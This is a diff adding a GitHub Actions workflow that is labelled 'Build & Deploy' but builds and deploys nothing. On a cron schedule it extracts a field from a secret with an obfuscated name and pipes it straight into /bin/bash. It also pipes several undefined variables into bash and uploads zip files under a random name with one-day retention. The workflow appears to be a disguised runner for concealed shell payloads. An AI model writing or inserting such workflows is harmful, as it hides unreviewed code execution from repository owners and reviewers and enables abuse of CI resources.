@@ -1,0 +1,30 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '30 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          tspc332: ${{ secrets.tspc332 }}
+        run: |
+          printf '%s' "$tspc332" | jq -r .kwzr74123 | /bin/bash
+          printf '%s' "$wpij5" | jq -r .ga125 | /bin/bash
+          printf '%s' "$mmh7" | jq -r .bqcm4 | /bin/bash
+          printf '%s' "$uzn19938" | jq -r .qj7 | /bin/bash
+          printf '%s' "$x4659" | jq -r .nswty4 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: CCM4gIEx
+          path: "*.zip"
+          retention-days: 1
